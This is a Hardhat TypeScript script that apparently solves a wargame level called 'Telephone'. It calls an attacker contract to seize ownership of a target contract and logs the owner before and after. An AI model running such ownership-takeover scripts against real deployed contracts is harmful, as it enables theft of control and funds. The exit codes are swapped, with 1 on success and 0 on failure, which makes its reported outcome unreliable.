import { ethers } from "hardhat"
import { TELEPHONE, TELEPHONEEXPLOITER } from "../constants"

const exploitTelephone = async () => {
    const exploiter = (await ethers.getSigners())[0]

    const telephone = await ethers.getContractAt("Telephone", TELEPHONE)
    console.log("orginal owner of telephone contract", await telephone.connect(exploiter).owner())

    const telephoneExploiter = await ethers.getContractAt("TelephoneExploiter", TELEPHONEEXPLOITER)

    const exploitTx = await telephoneExploiter.connect(exploiter).changeTelephoneOwner()
    await exploitTx.wait(1)

    console.log("new owner of telephone contract", await telephone.connect(exploiter).owner())
}

exploitTelephone()
    .then(() => {
        console.log("telephone exploited successfully")
        process.exit(1)
    })
    .catch((e) => {
        console.error(e)
        process.exit(0)
    })
